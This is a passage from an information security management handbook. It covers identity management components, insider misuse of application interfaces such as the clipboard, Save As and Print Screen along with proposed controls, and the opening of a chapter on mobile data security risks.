wants to protect data at different levels. Some items may not require any authenti-
cation, some may require username/password, and the most secure may require a 
hardware token.
SSO systems provide a central location to create authentication and authoriza-
tion rules. These rules can be centrally managed; generally, this is through a secure 
management system for the SSO environment. The ability to add and remove access 
from any application is a valuable time saver.
The value of SSO cannot be overlooked by an enterprise because it will provide 
valuable information on a user’s complete session throughout all of the protected 
applications. This is the audit trail provided by the SSO environment. Because 
the SSO software is protecting the applications and providing the security session 
across all Web-based platforms, it allows for the audit trail to track a user through-
out the entire session.
The SSO system provides a standard way for applications to rely on this frame-
work for a consistent level of security throughout an enterprise. SSO may be one 

Five Components to Identity Management Systems  ◾  27
of the most valuable pieces in the identity management components because it is 
capable of taking all the parts and making them all appear to work together to the 
end user. It provides centralized access control for the administrators.
SSO can be used with virtual directories and metadirectories. Combining SSO is 
becoming more normal at this point whereas traditionally the SSO system would be 
pointed at one or more identity directories with no additional middleware in between.
Be careful with SSO systems because many vendors try to provide extra func-
tionality at this level that can confuse some issues. Sometimes provisioning is pro-
vided by the same SSO software. This allows the users to create or delete users from 
the same software package. Although it may work well, it may be better to investi-
gate other components that specialize in these peripheral areas.
Overall, access control is probably the area where there are the most choices and 
decisions in identity management. An architect always has to consider using simple 
username/password combinations or to opt for more secure options, like hardware 
tokens. If these options grow or the management of the environment becomes too 
tough, usually the SSO option is a good choice. SSO was developed to ease the pain 
of administrators by providing centralized control of rules, logs, and sessions. The 
developers can rely on SSO for a standardized system across all applications, and it 
removes the need to develop a new authentication for each application. End users 
may not recognize an SSO system in use, but ideally they benefit as well by having 
to use fewer passwords.
2.5  Fourth Component
The management of the user identity in the identity directory is an aspect that 
grows exponentially as users are added to the system, new applications are added, 
and new roles for the users to request are added or modified. Unless the enterprise 
is a small environment, it is impossible for one person to be the point of contact to 
make modifications to permissions or roles. It is not a good idea to put a person in 
charge of making changes to the directory if that person is unable to understand the 
request being made and whether or not it is appropriate. Imagine an employee in a 
remote office of a thousand-person company sending an e-mail to an administrator 
in the central office asking for delete permissions in the accounting application. 
How many e-mails would have to be sent to get clarification on whether or not this 
person is supposed to gain this access? How would the answer given be verified to 
be true? This scenario is the exact reason for delegated administration capabilities. 
The decisions to make modifications to a person’s account should always be han-
dled by people that directly know who that person is and what responsibilities that 
person should have within the company’s applications. Delegated administration 
usually incorporates a workflow that defines an approval process. This is another 
example of an application that requires a strongly defined process flow. Enterprises 
that are still in growth mode that tend to change the process or poorly describe the 

28  ◾  Information Security Management Handbook
process of granting rights within a system are not ideal candidates for a delegated 
administration system. This type of application works great when the process can 
be defined easily, and the workflow and approval processes can be mapped easily 
into the system. However, one could argue that any company with a poorly defined 
process for approvals is in great need of maturing their processes so that delegated 
administration does work for them. Thus, it would benefit the company by allow-
ing growth that could be managed more easily.
Workflow is a component of delegated administration and is usually a neces-
sary component. In some cases, the approval or denial can be a one-person decision 
or an automatic decision. If an application is strictly restricted to managers on the 
East Coast, any manager with an attribute of West Coast would automatically get 
denied. Delegated administration many times is associated with role-based access 
control (RBAC). Because RBAC has trouble scaling the delegated administration, 
it was created to force the decisions out of the IT administrator’s hand and back 
into the lap of the business manager. As the workflow is designed, the key decision 
makers are mapped out. Human Resources (HR) information should be used to 
make sure the workflow understands who needs to be notified once an event is 
triggered. There are many capabilities that include the ability to have multistep 
approvals. This is the opposite of the automatic approval process. In this scenario, 
an approval may be required by the direct manager and the next highest manager 
or any other combination. The delegated administration should provide the ability 
to log and verify who gave access and on what day. This is a powerful piece of infor-
mation if it is discovered that an employee was given the wrong set of roles.
Recently, the addition of user certification has evolved as well in the delegated 
management arena. This requires managers to revisit who has access to their appli-
cations and certify that the list is correct. Sometimes users can move jobs, or stay in 
the same position but change their responsibilities. This is the instance where it is 
important to have the certification option implemented. Auditors always want this 
list to see who has access to what information. Being able to provide them a list that 
does not have hundreds of orphaned accounts or outdated access rights is always 
looked upon positively in the audit outcome.
The perfect time to implement delegated administration is always the sooner, 
the better for an enterprise. Be aware that some SSO applications will try to provide 
some level of delegated administration with the software. Although it may not have 
full workflow capabilities, it may suffice for the enterprise until a larger system can 
be purchased and designed. The SSO software usually offers it as a teaser for addi-
tional sales later as the needs grow and the enterprise matures with its processes.
The delegated administration can work for both internal and external users 
although the needs may be different. A typical issue for delegated administration 
manifests when the employees need to approve external entities roles. The issue arises 
because many times the delegated administration system is built with an internal 
view of the world from the beginning. The assumption is that external partners can 
have their own delegated administration system. It is easy to see the error in this 

Five Components to Identity Management Systems  ◾  29
discussion, but it does happen where the two systems are built separately and of 
course the needs change to have delegated administration in one system or at least 
two systems that are aware of each other. That creates more work and more costs as 
changing existing systems always do. It is best to try to make the delegated admin-
istration as flexible as possible and include the consideration that more processes 
will be dependent on outside systems or outside vendors or contractors participat-
ing in the complete process. Handling this concept drives the need for experienced 
vendors. When conducting this implementation, do not overlook the larger trends 
in computing, which is moving toward a more distributed workforce.
2.6  Fifth Component
The last core component in an IdM system is the provisioning layer. The term “pro-
visioning” is not new with identity management. It refers to the management of 
creating the user identity, and managing these identities throughout the entire life 
cycle of a user. This may sound somewhat similar to delegated administration. There 
are some similarities, and it could be said that provisioning will typically involve 
delegated administration and be carried out by a workflow process. The creation of 
a user is a perfect example of allowing the hiring manager to initiate the creation 
request for a user. The request will fall into a defined workflow that notifies IT, HR, 
and any other necessary core departments for the hiring of a new employee.
Provisioning is another component that could be added as a stand-alone piece 
of software or could be included as functionality within a metadirectory or del-
egated administration. Where it connects probably depends on the vendor’s view of 
how to solve the issue of managing the user life cycle.
Also, the provisioning piece will probably come with additional “adapters.” 
These pieces of software usually allow the provisioning system to hook into exist-
ing systems. The adapters are the pieces that allow a user account to be created on 
the internal network, an additional account on the mainframe, with a read-only 
account into the customer database. Each one of these databases, mainframes, or 
network directories could be provided by different software vendors and each is a 
completely different technology. It will not matter to the provisioning system. The 
availability of adapters may be an important decision in how to select a provision-
ing system. It is important to select a provisioning tool that has adapters provided 
which are useful right out of the box.
Once a user decides to move to another position, whether inside or outside of 
the company, the same provisioning tool that created the accounts on all of the 
remote systems can now disable the accounts through the same processes.
Although provisioning can appear to be a very small subset of features, it has 
become one of the more important because of the way systems are audited. Any 
user created should have proof of who initiated the creation. Users should be veri-
fied by at least one or more people with direct knowledge of the employee or into 

30  ◾  Information Security Management Handbook
a separate container for customers. The audit will look for length of time since the 
privileges were reviewed. If there are ten thousand user accounts, but only five 
thousand employees on the payroll, the auditor will start looking for explanations. 
Provisioning software could monitor the length of time a user has been in the sys-
tem. Certification periods should occur on the anniversary of the user’s creation 
date if possible, sooner if the data or systems are considered more secure. If a user 
cannot be certified in time, the user will lose access to the system until the certifica-
tion process can be completed. It is generally a best practice to disable accounts only 
and not to delete them totally. This again provides for some level of fact checking if 
a user’s access rights are called into question.
Self-registration is a specific subset of provisioning. This is the ability for end 
users to register themselves to the application or network. In most cases, self-regis-
tration is excellent for customers. Asking them to register is the first step in the pro-
visioning process. The customer information is collected and submitted, possibly 
for approval. Perhaps the account created is subject to a credit check, or possibly the 
account creation is set to automatic creation. Either way, self-registration gives flex-
ibility to the entire process and enables customers or employees to make requests 
when the time is right for them.
Finally, do not overlook the provisioning aspect of identity management. It is 
important not to assume that delegated administration gives a company provision-
ing capabilities. Many times vendors have chosen to offer some of the capabilities 
as an incentive for the customer to purchase add-on capabilities at a later point in 
time. Provisioning is very much related and dependent upon delegated administra-
tion and workflow. It is a critical piece that will be checked in any environment 
subject to audits.
2.7  Conclusions
It is important to realize that the more components are added, the more mature the 
overall IdM system is for the enterprise. Maturity is a good thing in IdM systems 
because the larger savings are derived from the more advanced pieces. Maturity can 
be measured by the level of features an IdM system can provide (Figure 2.3).
The components were presented in order from the lowest maturity to the high-
est. In describing the process, any enterprise would first need to have existing 
directories. Then, the pain of managing the directories sets in, and a virtual or 
metadirectory is implemented to make the management easier.
The single sign-on is a close one because it could exist without a virtual directory 
or metadirectory. However, many vendors in the SSO space created architectures 
that replicated data into one main directory store. Only a very few allowed for data to 
reside where it was created. This may sound like a familiar difference. Again, it is the 
difference between the metadirectory and virtual directory. Implementing some SSO 
software actually forces you to choose a meta or virtual architecture. Additionally, 

Five Components to Identity Management Systems  ◾  31
the SSO software is considered part of access control. Access controls that exist on an 
individual application basis are not really grounds for saying an enterprise has passed a 
low level of IdM maturity. However, integrating the access controls that are managed 
by an SSO system are maturing to a higher level. This shows that there is centralized 
management and controls in place to create rules for access to multiple applications. 
It demonstrates an ability to audit access to multiple applications centrally.
Finally, the end user is provided a consistent security session across all types of 
applications that can ensure a level of protection which is consistent for applications 
that are part of the SSO security layer. After the SSO options, the delegated admin-
istration piece can be added. This is where quite a bit of data mapping will take 
place. The data that controls access to the systems which are being integrated into 
the workflow will need to have connectors. Rules that provide the decision-making 
logic during a data conflict get developed during this implementation. Delegated 
administration can provide the greatest impact across a company in speeding up 
requests for new privileges. This is a true enterprise asset because all employees 
and possibly customers will use it at some point. Adding the provisioning piece 
again adds more value to the delegated administration and strengthens the overall 
implementation. The workflow that is part of the delegated administration and 
provisioning adds information on status of in-process flows. Every process that is 
mapped into the system becomes easier to track and view at any point. This is one 
of the highest levels of IdM and provides a basis for the key components.
After these key components have been implemented, the enterprise now has 
the ability to go back and continue adding additional management pieces that may 
provide abilities like a public key infrastructure (PKI). Adding something like a 
PKI is typically considered very tough to manage, but if a delegated administra-
tion system with yearly certification of end users’ access rights was already in place, 
Components
Provisioning
Delegated Administration
Workﬂow
Access Control
Single Sign-On
Key Fob
Usermane/Passwords
Metadirectory or Virtual Directory
User Directory LDAP User Directory Relational
Database
User Directory
Mainframe
Maturity Level
Figure 2.3  Maturity can be measured by the level of features an IdM system 
can provide.

32  ◾  Information Security Management Handbook
adding additional public key issuing capabilities would easily fit as just another 
workflow in the delegated administration. Public key infrastructure was not men-
tioned as a key component because it is generally considered to be very expensive 
and tough to manage on a per-user basis. It is a perfect example of a technology that 
could benefit by having these processes in place.
Overall, the importance of an IdM system is critical to enterprises of all sizes. 
Only a very small enterprise can even exist without a user directory of some degree. 
Managing this directory data is important and critical to all processes within the 
enterprise. Building the infrastructure from the beginning for flexibility is impor-
tant. Establishing the precedence for these types of processes and systems allows for 
faster, more manageable growth in the future.

33
3
Chapter 
Security Weaknesses of 
System and Application 
Interfaces Used to Process 
Sensitive Information
Sean M. Price
3.1  Introduction
Organizations that process sensitive information must contend with the insider 
threat. Examples of sensitive information include proprietary, privacy, financial, 
or classified government information. The insider threat occurs when individuals 
authorized access to a system and its information willingly decide to violate policies 
by negatively impacting the confidentiality, integrity, or availability of the system or 
information. Modern operating systems contain a variety of security controls that 
include authentication, auditing, and access control list (ACL) mechanisms that 
Contents
3.1  Introduction..................................................................................................33
3.2  Background.................................................................................................. 34
3.3  Interface Security Weaknesses........................................................................35
3.4  Proposed Solutions........................................................................................37
3.5  Conclusion....................................................................................................39
References............................................................................................................39

34  ◾  Information Security Management Handbook
can be used to hold individuals accountable and limit the possible damage that may 
occur (Silberschatz, Galvin, and Gagne 2004). Security controls are configured to 
support an organization’s security policy. Unfortunately, many applications do not 
provide a capability to extend the security policy to the user’s interface (Neumann 
1999). This situation provides an avenue for the malicious user surreptitiously to 
alter or remove sensitive information through normal interfaces provided by the 
system and its applications. Due to the lack of granular security policy enforcement 
on application interfaces, organizations rely on written policies, training, and espe-
cially trust to protect sensitive information.
3.2  Background
Users are typically delegated a certain amount of trust (Nguyen, Reiher, and 
Kuenning 2003). They are expected not to violate the provided trust. In organi-
zations with sensitive information, security policies are used to specify what user 
actions regarding the system are acceptable (Whitman 2003). Unfortunately, some 
users ignore policy and make decisions that affect the confidentiality, integrity, 
and availability of systems and information. Users that violate their trust can do so 
through the interfaces provided to access the system as opposed to only through 
the introduction of malicious software. User interfaces of commercial off-the-shelf 
(COTS) products may not have built-in policy enforcement mechanisms that are 
robust enough to support an organizational security policy and prevent these kinds 
of abuses.
Some operating systems and applications provide mechanisms to enforce pol-
icy through configurations. Two mechanisms used to provide policy enforcement 
include ACLs and policy configurations. Proper configuration of ACLs can support 
the concept of least privilege and prevent users from directly accessing information 
for which they are not authorized. However, this is not always completely enforce-
able on systems that only provide discretionary access control (DAC). For instance, 
suppose that user A is authorized read access to file S and user N is prohibited by 
policy from reading S. If A creates a new file C, which is a copy of S, and gives N 
read access to C, then a policy violation occurs because N has access to the contents 
of S. In this regard, DAC is unable to support the desired security policy fully. 
Thus, to alleviate this situation may require some implementation of originator-
controlled access control (Bishop 2003). Individual system policy configurations 
can be set to enforce a desired security policy. For example, a policy can be set on 
a Windows NT-based system to deny ordinary users the ability to use the built-in 
registry editing tools. Although this is a prudent security measure, it can be easily 
circumvented by running the tool from removable media.
Users performing sensitive operations on a system expect that an application 
will not inadvertently disclose the information during its period of processing. 
Unfortunately, applications are not always designed to restrict access to information 

Security Weaknesses of System and Application Interfaces  ◾  35
by other users. This can occur when temporary files containing the sensitive infor-
mation remain on the system in locations that are accessible to other users. Another 
way sensitive information can be exposed is through the existence of malicious soft-
ware eavesdropping on the user’s activity. Users may be unaware that the activity 
and interaction with the trusted application is being spied on by another process. 
In the situation of information disclosure through the actions of applications, user 
trust in the system and application is degraded.
This chapter will focus on the problems associated with user abuse of authorized 
interfaces. Common interface aspects that provide a user with the ability to circum-
vent or disregard security policy will be presented. The discussion is centered on 
Microsoft Windows NT-based operating systems and compatible applications, but 
much of the information is applicable to other operating systems that also make use 
of graphical interfaces.
3.3  Interface Security Weaknesses
Interfaces are primarily designed to support the end user. Designers of COTS prod-
ucts may not always consider the implications of the product in an environment 
where access to sensitive information should be controlled. Likewise, nonsecurity-
focused products may not be designed to support an organization’s security policy. 
Insiders abusing their access are provided the tools to do so from the proliferation 
of COTS products that do not provide organizations with the flexibility to support 
a security policy. This represents a security design problem in user interfaces.
A number of common elements within application and system interfaces pro-
vide avenues for users to circumvent policy. These common features include menu 
items; standard operating system interfaces; selective policy settings; and applica-
tion extensibility through mobile code, scripting, and add-ins.
Default application menus provide a number of ways for users to abuse their 
access. Many application menus provide a similar standard of user functions. Menu 
items are browsed and selected by the user through mouse or keyboard actions. 
Functions available through menus are typically accessible by end users unless the 
system or application has a policy enforcement mechanism that hides or disables 
their functionality.
One of the most prevalent functions under a typical File menu is the option to 
Save or Save As. This provides users with the ability to save their work or the display 
to any location desired. However, this provides an avenue for sensitive information 
to be removed from a system. A user need simply save a copy of the file to removable 
media and walk out with the sensitive information. This type of action is typically 
not audited by applications or systems and, therefore, is difficult to detect. COTS 
products do not generally restrict the ability to save files from the menu options. 
The inability of organizations to enforce a policy through application interfaces 
puts their sensitive information at risk. Granted, it is necessary for users to save 

36  ◾  Information Security Management Handbook
their work, but a policy determining where a file may be saved should be supported 
by a security policy-enabled interface.
Another menu item allowing users to remove information is the Print function. 
This interface action can provide hard copies of viewed information. Fortunately, 
some operating systems, such as those based on Windows NT, provide for some 
audit capability of printing actions. However, this can be circumvented if the 
printer is connected directly to a workstation.
Web browsers have a unique menu option that allows the user to view the 
source code of the Web page. This provides the end user with all of the displayed 
information in Hypertext Markup Language (HTML) format. The user has com-
plete access to any sensitive information displayed through the browser. This is 
problematic when organizations make use of browsers as the user interface for their 
databases. Browsers usually associate a specific application for viewing the source 
code. In a Microsoft Windows environment, the Notepad application is typically 
used for this purpose. The ability to view the source code of a Web page is yet 
another method of extracting sensitive information from a system.
The clipboard is a command interface shared between applications and operat-
ing systems, providing the user with the ability to copy and paste text and objects. 
Clipboard functions are utilized through hotkey combinations and application 
graphical interfaces. The Copy, Cut, and Paste functions can be found under the 
Edit menu. These editing functions place copied or cut data into a shared memory 
location that is available for all applications and the system to use. This ubiquitous 
capability allows users to move data between applications easily. It also provides a 
simplistic method to copy sensitive data from one location and paste it into another 
in violation of organizational policies. Copy and paste operations are not usually 
audited regarding the actual content that was copied and pasted. This situation 
makes it difficult to detect insider misuse of systems and policy violations using 
clipboard methods.
Some applications have the ability to automate internal tasks through scripts. 
Some script technology, such as JavaScript, enhances the user experience by ani-
mating tasks, performing calculations, or automating application operations. In the 
case of browsers and other applications like Microsoft Office products, local users 
frequently have access to a script’s source code. A malicious user may alter the code 
to cause the application to perform other functions not originally intended by the 
script. Likewise, nefarious users may develop their own scripts to subvert the inter-
face or, in the case of a database application, the current transaction.
Providing users with an ever-enriching environment has led to the exploitation 
of software extensibility where an application allows the execution of foreign or 
mobile code within their process. Extensible objects include plug-ins and add-ins 
which are typically ActiveX controls that provide functionality beyond the scope 
of the original application. Likewise, Java applets provide extensibility as well, but 
with the possibility to limit their actions through the Java sandbox (Oaks 2001). 
Insiders may abuse this functionality by introducing malicious extensible objects 

Security Weaknesses of System and Application Interfaces  ◾  37
designed to circumvent a security policy. The ability to include an add-in is gener-
ally available to users through sub-menu items.
Some applications do provide limited support for an organizational security 
policy. These applications have menu options to enable or disable capabilities such 
as mobile code and scripting. Unfortunately, users may possess sufficient system 
rights to set these security options at their own discretion. It is possible to prevent 
users from altering the policy for some applications that allow control to the inter-
face through configuration files or the system registry. Users can be prevented from 
making unauthorized changes to the interface policy through the use of a properly 
configured ACL for the configuration file or registry key. The failure to implement 
the appropriate controls is viewed as a security operations problem (Patrick, Long, 
and Flinn 2003).
Standard keyboards have a function key called Print Screen. When pressed, 
this key sends a message to the operating system to capture the entire screen (or a 
portion of it when used in conjunction with the Alt key) graphically. In Microsoft 
Windows, the captured bitmap image is placed on the clipboard for the user. The 
image can then be used by any program capable of working with raw bitmap data. 
This provides yet another interface where the user may arbitrarily capture sensitive 
data and place it into a file for removal from the system.
File and object access mediated by a system’s DAC mechanism may not be 
granular enough to detect or deter inappropriate access. For example, Web brows-
ers typically cache Web pages before displaying them. By default the user has full 
access to the source information in the page. This is because the user becomes the 
owner of the file object when the page is cached. Object owners have complete 
control according to the Windows DAC mechanism. Cached pages of sensitive 
information from organizational databases could easily be copied to other media 
using tools capable of reading and creating files. Discretionary access control fails 
to extend a security policy for specifying the types of applications authorized to 
read or modify a given file.
The former discussion has focused on the graphical aspects of application and 
system interfaces that can be exploited by an insider to compromise sensitive infor-
mation. A final interface to consider is the command environment. A command 
interpreter or shell provides a nongraphical route to compromising data as well. 
Utilities exist for copying, modifying, and moving files on most operating systems. 
Protecting sensitive information from insider abuse with application and system 
interfaces requires careful consideration of all possible avenues an ordinary user 
might use to subvert a security policy.
3.4  Proposed Solutions
Application interfaces should be flexible enough to allow for the implementation of 
an organization’s security policy. Providing system owners with the ability to define 

38  ◾  Information Security Management Handbook
the components of an interface without user intervention is referred to as implicit 
security (Grinter and Smetters 2003). Interfaces designed with implicit security 
will provide organizations with a mechanism to reduce the number of methods an 
insider might use to remove sensitive information from a system surreptitiously. 
Menu functions permitting file manipulation actions such as Save As, Print, Copy, 
Cut, and Paste could be disabled, removed, or redirected so that information can-
not be mishandled through the interface.
Clipboard functions shared between the system and applications represent a 
substantial challenge to control. Three possible approaches should be considered 
when attempting to control clipboard functions:
First, all interfaces with the standard clipboard commands of Cut, Copy, and 
Paste should be disabled or removed. This would prevent the user from navi-
gating through a menu to select the desired clipboard functions. Removing 
the functions from the menu selections, as opposed to disabling them, would 
follow good human–computer interface practices. Efficiency is increased by 
removing unusable items, which additionally reduces the total menu options 
(Preece, Rogers, and Sharp 2002). Retaining a disabled menu item would 
likely disrupt the user’s internal locus of control due to his inability to utilize 
the restricted functions (Shneiderman and Plaisant 2005).
Second, keyboard shortcuts for clipboard functions also need to be negated. This 
could be accomplished by capturing keyboard activity through system hooks 
(Simon 1997). Print Screen key activity should also be captured through 
hooks in addition to capturing clipboard shortcut combinations.
The third control necessary to prevent a determined insider from removing 
information is to empty the clipboard contents continuously. This is a neces-
sary activity in the event the insider introduces other software that might 
perform other types of capture methods and place the data on the clipboard. 
Although the clipboard function provides a potential path to remove infor-
mation from the system, it has become a necessary feature that provides user 
efficiency, and therefore, a similar functionality should be retained.
The clipboard functions found in most menus are necessary for normal edit-
ing tasks. Completely eliminating this capability would certainly reduce user 
efficiency. Alternatively, the system’s clipboard capability could be wrapped and 
a policy mechanism implemented to control what may be copied and to where it 
may be placed. Implementing generic wrappers would provide a way to detect and 
respond to clipboard activity (Chari and Cheng 2003).
Wrapping functions have also been used as a form of misuse detection (Bowen 
and Segal 2000). In this sense, a system wrapper could be used as a policy enforce-
ment mechanism to prevent unauthorized activity such as inappropriate file access 
or unauthorized process activation. Wrappers could be used to detect access to 
sensitive files. This functionality would be necessary to detect inappropriate access 

Security Weaknesses of System and Application Interfaces  ◾  39
to Web pages cached by a browser. Alternatively, system call functions could be 
monitored for inappropriate access (Nguyen, Reiher, and Kuenning 2003).
Systems supporting DAC only check for the rights of a user to access an object 
and to what degree any modification is permitted. What DAC does not support is a 
specification for the permitted type of application or interface authorized to manip-
ulate an object. The concept of extending an ACL to include authorized applica-
tions was demonstrated by Schmid, Hill, and Ghosh (2002). In their research, 
access to a protected document was only allowed when called by the authorized 
program. This concept helps ensure that sensitive information is not being accessed 
by malicious code. This concept could be extended to prevent malicious users from 
attempting to remove files from the system. Suppose we have information in file 
S accessible using program X. Using the approach proposed by Schmid, Hill, and 
Ghosh, a malicious user could be prevented from accessing S using any program 
other than X.
3.5  Conclusion
The insider threat must be dealt with by organizations to minimize the loss of con-
fidentiality and integrity of sensitive information. Currently, application interfaces 
provide numerous methods for users to remove sensitive information from a system 
surreptitiously, in violation of a security policy. System and application interfaces 
could be modified to remove the functionality or be wrapped to negate attempts 
to circumvent the policy. Whatever method is used, efficiency for the user and a 
center of locus must be maintained or users will reject the system. Security practi-
tioners and system developers are encouraged to consider the attributes of applica-
tion interfaces and integrate policy aspects that can be used to control the actions 
of insiders granularly.
References
Bishop, M. 2003. Computer Security: Art and Science. Boston: Addison-Wesley.
Bowen, T.F. and Segal, M.E. 2000. Remediation of application-specific vulnerabilities at 
runtime. IEEE Software, 175, 59–67.
Chari, S.N. and Cheng, P. 2003. Blue Box: A policy-driven, host-based intrusion detection 
system. ACM Transactions on Information and System Security, 62, 173–200.
Grinter, R.E. and Smetters, D.K. 2003. Three Challenges for Embedding Security into 
Applications. Paper presented at the meeting of the CHI 2003 Workshop on Human–
Computer Interaction and Security Systems, April 6, Fort Lauderdale, FL.
Neumann, P.G. 1999. Risks of insiders. Communications of the ACM, 4212, 160.
Nguyen, N., Reiher, P., and Kuenning, G.H. 2003. Detecting insider threats by monitor-
ing system call activity. Proceedings of the Information Assurance Workshop, 2003. IEEE 
Systems, Man and Cybernetics Society, 45–52.

40  ◾  Information Security Management Handbook
Oaks, S. 2001. Java Security 2nd ed. Sebastopol, CA: O’Reilly & Associates.
Patrick, A.S., Long, A.C., and Flinn, S. 2003. HCI and security systems. Proceedings of the 
Conference on Human Factors in Computing Systems CHI ‘03 Extended Abstracts on 
Human Factors in Computing Systems, 1056–1057.
Preece, J., Rogers, Y., and Sharp, H. 2002. Interaction Design: Beyond Human–Computer 
Interaction. New York: John Wiley & Sons.
Schmid, M., Hill, F., and Ghosh, A.K. 2002. Protecting data from malicious software. 
Proceedings of the 18th Annual Computer Security Applications Conference, 199–208.
Shneiderman, B. and Plaisant, C. 2005. Designing the User Interface: Strategies for Effective 
Human–Computer Interaction, 4th ed. Boston: Pearson Education.
Silberschatz, A., Galvin, P.B., and Gagne, G. 2004. Operating System Concepts with Java, 6th 
ed. Hoboken, NJ: John Wiley & Sons.
Simon, R.J. 1997. Windows NT WIN32 API Super Bible. Corte Madera, CA: Waite 
Group Press.
Whitman, M.E. 2003. Enemy at the gate: threats to information security. Communications 
of the ACM, 468, 91–95.

2
TELECOMMUNICATIONS 
AND NETWORK SECURITY


43
4
Chapter 
Mobile Data Security
George G. McBride
4.1  Introduction
Data breach. Information loss. Laptop theft. We typically don’t go more than a 
few days without hearing about another loss of a laptop, a personal digital assistant 
(PDA), or perhaps even a USB memory drive. Was it Social Security numbers? 
Perhaps the medical history of several hundred thousand people? The strategic 
vision or initial public offering (IPO) plans of the company? Was the drive just lost 
or intentionally stolen? Most of the time, it doesn’t even matter. Oftentimes, the 
results of the news hitting the newspapers or a popular Website is enough to soil 
the reputation and image of the company, to cause the stock price to take a dip, and 
make you wonder if you should start checking the employment pages.
We live in a world where electronic information grows at a phenomenal rate. 
In 1982, my Commodore VIC-20 computer had less than 5 kilobytes (KB) of 
memory. In 1985, my Apple //GS computer came with a whopping 64 KB, which 
seemed to be an infinite source that could never be fully utilized. Today, with much 
larger programs and larger amounts of data, we’re carrying 4 and 8 gigabytes (GB) 
Contents
4.1	 Introduction................................................................................................43
4.2	 Before You Can Measure the Risks.............................................................45
4.3	 Mobile Devices.......................................................................................... 46
4.4	 Controls and Safeguards.............................................................................50
4.5	 Assessing and Auditing...............................................................................54
4.6	 Conclusions.................................................................................................54

44  ◾  Information Security Management Handbook
USB memory drives, PDAs with 16 GBs, and laptops with 250-GB hard drives. 
Add a 1-terabyte (TB) portable USB hard drive and you can easily carry around all 
of the data that you could ever read or even need in a lifetime.
Many years ago when I worked for a large telecommunications firm, we had a 
policy that our laptops were to be securely cabled to a desk or permanent fixture 
in the office if we left them overnight. Being a dutiful corporate citizen, I left my 
laptop in the office one night secured to the desk and even had both keys with me. 
Early the next morning I returned to find an antitheft cable laying on the floor, its 
frayed end evidence that it had been cut off. Fortunately for me a piece of the cable 
had been left in the office; otherwise I would have had to convince management 
and corporate security that I had actually secured the laptop.
Several months later, a person—likely innocent—told the police that he had 
purchased the laptop at a flea market for a few hundred dollars. Neither the lock 
still secured to the laptop nor the power-on BIOS password succeeded in stopping 
the purchaser from making a rational decision to pass on the purchase. When the 
purchaser called the computer manufacturer for some tips on how to remove the 
BIOS password and provided the computer serial number to the technician, the 
police were notified. When I left the firm several years later, the laptop was still in 
police custody as evidence.
This instance illustrates the difference between a deterrent and a preventa-
tive control. The cable deters a malicious person only to the point of choos-
ing an easier target. Unfortunately, the easier targets had already been stolen 
that evening, and those that were cabled to the desk became fair game. Would 
a preventative control, such as locking the device inside a desk drawer, have 
been sufficient? What controls may have been sufficient to prevent the theft 
besides taking the laptop home with me, possibly exposing it to a different 
threat element?
The lesson here is that it is not just one safeguard that is the solution, but the 
deployment of a layered defense of carefully selected safeguards. Had the BIOS 
password not been installed, the laptop may never have been recovered as the pur-
chaser easily could have booted up the laptop and installed any operating system 
without the need of help from the manufacturer. What is not known is whether 
the data stored on the hard drive was ever accessed. Although it appears that a 
financial motive existed to steal the laptop for later sale at a flea market and not to 
a competitor, it is only conjecture, and without a strong disk-based encryption to 
protect the data on the hard drive, we know that we didn’t prevent the thief from 
accessing the data. This is the question that is often asked after the theft of a device 
that has stored any type of sensitive data, and it is a question that shouldn’t matter 
when sufficient controls are deployed and you are comfortable, if not certain, that 
your data will be adequately protected.
In this chapter, we’ll review some of the many threats and risks that exist today 
to mobile devices of all shapes and sizes. From USB memory drives to laptops and 
from traditional mobile phones to smart phones, we’ll discuss available controls 

Mobile Data Security  ◾  45
and safeguards that can be implemented to reduce the overall level of mobile device 
risk and we’ll discuss tips to help audit and assess the overall security of an organi-
zation’s mobile device infrastructure.
4.2  Before You Can Measure the Risks
A number of risks should be considered when developing a program to secure mobile 
devices and data. One of the first constraints to measuring the risk to mobile data is 
evident when we look at a typical risk equation, which addresses the risk as a func-
tion of the asset(s) under consideration. However, most organizations do not know 
their asset base and consequently are challenged when calculating the risk of a device 
and especially of an infrastructure of tens of thousands of devices. Few organiza-
tions have an up-to-date and accurate asset inventory list. Fewer organizations have 
an accurate inventory of PDAs and smart phones in use. Add to that the devices that 
can be purchased by individuals, and you may feel that the task is impossible.
Some proven methods exist to understand the data population of mobile devices 
within the organization. I have seen surveys utilized as a successful tool to obtain 
a device count. I have seen reviews of inventory purchases, reviews of software 
installed on desktops (such as the synchronization software), and even a top-down 
approach of managers querying their teams for data. Each has its own merits and 
inherent flaws, but manages to get some of the data that will help determine sta-
tistically the count within the organization. Moving forward in this chapter to the 
policy section, if you are having a difficult time determining the inventory, it may 
be necessary to strengthen the policy to reflect the requirements of the organiza-
tion, such as allowing only firm-provided and firm-supported devices to be utilized 
and authorized to access and to store corporate information.
In addition to understanding the inventory count of the devices, it will be 
important to know the type of information that is at risk. For example, a data clas-
sification guide should exist to help associates within the firm have the knowledge 
to know who is responsible for classifying documents, how documents should be 
classified based on their content, and the effect to the firm if they are lost or stolen, 
etc. The document should provide solid guidance on how to classify all documents 
and content such as Web pages and e-mail that exist today and those that are cre-
ated in the future.
A data inventory program is useful to know the types of data that exist within 
the organization and the relative amounts of data in each data classification cat-
egory once they have been established. For example, it may be quite helpful to 
know that a particular organization in the firm does not access or manage sensitive 
documents and consequently incurs less of a risk than does a business unit that 
manages highly sensitive documents. The organization posing less of a risk may be 
addressed after the organizations with higher levels of risk have been addressed and 
may ultimately have fewer controls applied when addressed.

46  ◾  Information Security Management Handbook
Finally, a data retention program may specify what data needs to be retained 
within the organization and establish schedules for regularly purging unnecessary 
or obsolete data. The data retention program, whether it addresses e-mail being 
archived from local message stores to a central server or it states that completed 
client engagement data must be securely and centrally archived and preserved, can 
actually reduce the amount of sensitive information stored on devices and the over-
all risk from those devices.
Wow. We’ve already discussed asset inventories, data classification, data inven-
tories, and the benefits of a data retention program and we’ve barely scratched the 
surface of mobile data security. Unfortunately, if you start at the device security 
and focus exclusively on that, you’ll reduce the risk, but you’ll have avoided some 
areas that will have significant benefits not just with mobile devices, but through-
out the entire organization. That being said, rather than embarking on a lengthy 
and focused process to build out the programs and then addressing mobile data 
security, I’d recommend a parallel approach that minimizes the threat imposed by 
mobile devices and addresses some of the risks discussed later in this chapter, along 
with an approach that lays a solid foundation for information security by incorpo-
rating the programs mentioned earlier.
4.3  Mobile Devices
Mobile data security refers to securing the data that is stored on or accessed by 
any type of mobile device from an old Palm™ Pilot 1000 or an Apple iPhone to a 
brand-new laptop. Some of the risks and controls that are discussed will also apply 
